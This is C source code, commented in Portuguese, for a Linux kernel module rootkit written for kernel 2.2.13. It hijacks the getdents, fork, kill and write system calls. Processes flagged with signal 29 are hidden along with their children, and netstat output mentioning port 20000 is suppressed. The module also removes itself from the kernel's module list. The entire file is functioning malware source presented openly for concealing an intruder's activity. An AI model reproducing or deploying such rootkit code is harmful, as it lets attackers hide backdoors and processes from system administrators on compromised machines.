/* LKM para esconder um processo pai e seus filhos.
   Desenvolvido por Nash Leon vulgo coracaodeleao.
   nashleon@yahoo.com.br
   Feito para kernel 2.2.13 (Slackware 7.0)
   Thanks Unsekurity Team.
   http://unsekurity.virtualave.net/
   http://unsekurity.cyberpunk.com.br/
   Este modulo foi baseado no tutorial de LKM by THC.
   http://www.infowar.co.uk/thc/
*/

#define   MODULE
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/malloc.h>
#include <linux/stat.h>
#include <linux/if.h>
#include <linux/unistd.h>


#define PF_INVISIBLE 0x10000000
#define OCULTA	     29 
#define DESOCULTA    30
#define PROCESSO     ":20000"

extern void* sys_call_table[];
static int errno; 

static inline _syscall1(int, fork, int, regs);
static inline _syscall2(int, kill, pid_t, pid, int, sig);

/* P/ pegar os systemcalls normais */

static int (*original_kill)(pid_t, int);
int (*original_getdents) (uint, struct dirent *, uint);
static pid_t (*original_fork)(struct pt_regs);
int (*original_write)(unsigned int, char *, size_t);

static int hacked_write(unsigned int fd, char *buffer, size_t count);
static int hacked_getdents(unsigned int, struct dirent *, unsigned int);
static int meu_atoi(char *);
static int escondendo(pid_t);


static int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
unsigned int tmp, n;
int proc = 0, t;
struct inode *dinode;
struct dirent *dirp_kern, *p_dk;

if(!(tmp = (*original_getdents) (fd, dirp, count)))
return -errno;

#ifdef __LINUX_DCACHE_H
	dinode = current->files->fd[fd]->f_dentry->d_inode;
#else
	dinode = current->files->fd[fd]->f_inode;
#endif

if(dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
proc = 1;

dirp_kern = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
copy_from_user(dirp_kern, dirp, tmp);
p_dk = dirp_kern;
t = tmp;
while (t > 0) 
{
n = p_dk->d_reclen;
t -= n;

if(proc && escondendo(meu_atoi(p_dk->d_name)))
{
if (t != 0)
memmove(p_dk, (char *) p_dk + p_dk->d_reclen, t);
else
p_dk->d_off = 1024;

tmp -= n;
}

if (p_dk->d_reclen == 0) 
{
tmp -= t;
t = 0;
}

if (t != 0)
p_dk = (struct dirent *) ((char *) p_dk + p_dk->d_reclen);
}

copy_to_user(dirp, dirp_kern, tmp);
kfree(dirp_kern);
return tmp;
}


static pid_t hacked_fork(struct pt_regs regs)
{
pid_t pid;
int hideit;
struct task_struct *t = current;

hideit = escondendo(current->pid);
pid = (*original_fork)(regs);

do
{
if(t->pid == pid)
	break;

t = t->next_task;
} while(t != current);

if(t->pid == pid && hideit)
t->flags |= PF_INVISIBLE;

return pid;
}


static int hacked_kill(pid_t pid, int sinal)
{
int ret;
struct task_struct *t = current;

/* Abaixo faz comparacao do signal desejado */

if(sinal != OCULTA && sinal != DESOCULTA){
if((ret = (*original_kill)(pid, sinal)) == -1)
return -errno;
return ret;
}
do
{
if(t->pid == pid)
break;

t = t->next_task;
} 
while(t != current);

if(t->pid != pid)
		return -ESRCH;

switch(sinal)
{
case OCULTA:
t->flags |= PF_INVISIBLE;
break;

case DESOCULTA:
t->flags &= ~PF_INVISIBLE;
break;

default:
break;
}

	return 0;
}


static int meu_atoi(char *string)
{
char *p;
int ret = 0;
int m = ret + 1;

for(p = &string[strlen(string) - 1];p >= string;p--)
{
if(*p < '0' || *p > '9')
return 0;

ret += (*p - '0') * m;
m *= 10;
}

return ret;
}


static int escondendo(pid_t pid)
{
struct task_struct *t = current;

do
{
if(t->pid == pid)
	break;

t = t->next_task;
}
while(t != current);

if(t->pid != pid)
return 0;

return (t->flags & PF_INVISIBLE);
}

int hacked_write(unsigned int fd, char *buffer, size_t count){
char tmp[1000];
if (strcmp(current->comm, "netstat") == 0 ) {
memset(tmp, 0, sizeof(tmp));
copy_from_user(tmp, buffer, sizeof(tmp)-1);
if(strstr(tmp,PROCESSO)) {
return count;
                           } 
       	   }
return original_write(fd, buffer, count);
}




int init_module(void)
{
/* Abaixo segue esquema para esconder LKM */
struct module *modulo = &__this_module, *apagar = NULL;
EXPORT_NO_SYMBOLS; /* Macro para nao exporta simbolo kernel */
apagar = modulo->next;
/* Fazer tudo == NULL */
if (apagar) {
int i;
modulo->name = apagar->name;
modulo->size = apagar->size;
modulo->flags = apagar->flags;

for (i = 0; i < GET_USE_COUNT(apagar)+1; i++)
MOD_INC_USE_COUNT;
modulo->next = apagar->next;
}

original_getdents = sys_call_table[__NR_getdents];
original_fork = sys_call_table[__NR_fork];
original_kill = sys_call_table[__NR_kill];
original_write = sys_call_table[__NR_write];

sys_call_table[__NR_getdents] = hacked_getdents;
sys_call_table[__NR_fork]  = hacked_fork;
sys_call_table[__NR_kill]  = hacked_kill;
sys_call_table[__NR_write] = hacked_write;
return 0;
}


void cleanup_module(void)
{
sys_call_table[__NR_getdents] = original_getdents;
sys_call_table[__NR_fork] = original_fork;
sys_call_table[__NR_kill] = original_kill;
sys_call_table[__NR_write] = original_write;
}
